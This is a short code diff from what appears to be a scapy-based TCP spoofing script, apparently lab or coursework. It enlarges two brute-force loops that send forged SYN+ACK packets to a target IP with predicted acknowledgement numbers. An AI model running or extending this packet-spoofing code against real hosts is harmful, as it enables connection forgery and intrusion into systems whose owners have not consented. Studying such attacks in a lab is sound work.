@@ -159,8 +159,8 @@ if __name__ == "__main__":
         #  (predicted_ack - 1) to get our original prediction.
         #
         # Since my VM keeps breaking, just spam SYN+ACKS and brute force:
-        for i in range(10):
-            for port_offset in range(2):
+        for i in range(15):
+            for port_offset in range(10):
                 send(
                     target_ip_layer / TCP(
                         ack=(predicted_ack) + 64_000 * i, 
@@ -213,8 +213,8 @@ if __name__ == "__main__":
             )
         )
 
-        for i in range(10):
-            for port_offset in range(2):
+        for i in range(15):
+            for port_offset in range(10):
                 send(
                     target_ip_layer / TCP(
                         ack=(predicted_ack) + 64_000 * i, 
